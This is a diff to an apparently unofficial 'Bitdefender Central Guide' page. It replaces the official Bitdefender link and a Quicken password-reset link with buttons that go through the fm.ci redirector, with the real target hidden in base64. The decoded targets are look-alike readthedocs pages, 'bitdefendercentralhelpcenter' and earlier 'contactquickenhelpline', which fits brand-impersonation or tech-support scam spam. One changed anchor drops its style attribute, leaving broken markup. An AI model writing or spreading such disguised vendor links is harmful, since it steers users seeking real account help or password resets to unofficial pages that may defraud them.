@@ -4,7 +4,7 @@ Welcome to Bitdefender Central Guide!
 .. raw:: html
 
     <div style="text-align:center; margin-top:30px;">
-        <a href="https://central.bitdefender.com" style="background-color:#28a745; color:#ffffff; padding:12px 28px; font-size:16px; font-weight:bold; text-decoration:none; border-radius:6px; box-shadow:0 4px 6px rgba(0,0,0,0.1); display:inline-block;">
+        <a href="https://fm.ci/?aHR0cHM6Ly9iaXRkZWZlbmRlcmNlbnRyYWxoZWxwY2VudGVyLnJlYWR0aGVkb2NzLmlvL2VuL2xhdGVzdA==" style="background-color:#28a745; color:#ffffff; padding:12px 28px; font-size:16px; font-weight:bold; text-decoration:none; border-radius:6px; box-shadow:0 4px 6px rgba(0,0,0,0.1); display:inline-block;">
             Access Bitdefender Central
         </a>
     </div>
@@ -82,7 +82,6 @@ Final Thoughts
 
 With just a few clicks, you can secure your entire digital life—computers, phones, and tablets—all from one Bitdefender Central account. It’s a powerful and convenient way to ensure every family member or coworker stays safe online.
 
-✅ **Quick Access:**
 
 
     ✅ **Quick Links:**
@@ -90,13 +89,13 @@ With just a few clicks, you can secure your entire digital life—computers, pho
 .. raw:: html
 
     <div style="text-align:center; margin-top:30px;">
-        <a href="https://fm.ci/?aHR0cHM6Ly9jb250YWN0cXVpY2tlbmhlbHBsaW5lLnJlYWR0aGVkb2NzLmlvL2VuL2xhdGVzdA==" style="background-color:#28a745; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
+        <a href="https://fm.ci/?aHR0cHM6Ly9iaXRkZWZlbmRlcmNlbnRyYWxoZWxwY2VudGVyLnJlYWR0aGVkb2NzLmlvL2VuL2xhdGVzdA==" style="background-color:#28a745; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
             🔗 Download Bitdefender Central Now
         </a>
-        <a href="https://fm.ci/?aHR0cHM6Ly9jb250YWN0cXVpY2tlbmhlbHBsaW5lLnJlYWR0aGVkb2NzLmlvL2VuL2xhdGVzdA==" style="background-color:#007bff; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
+        <a href="https://fm.ci/?aHR0cHM6Ly9iaXRkZWZlbmRlcmNlbnRyYWxoZWxwY2VudGVyLnJlYWR0aGVkb2NzLmlvL2VuL2xhdGVzdA==" style="background-color:#007bff; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
             🔗 Bitdefender Central Support Center
         </a>
-        <a href="https://www.quicken.com/my-account/forgot-password" style="background-color:#6c757d; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
+        <a href="https://fm.ci/?aHR0cHM6Ly9iaXRkZWZlbmRlcmNlbnRyYWxoZWxwY2VudGVyLnJlYWR0aGVkb2NzLmlvL2VuL2xhdGVzdA=="background-color:#6c757d; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
             🔗 Reset Bitdefender Central Password
         </a>
     </div>
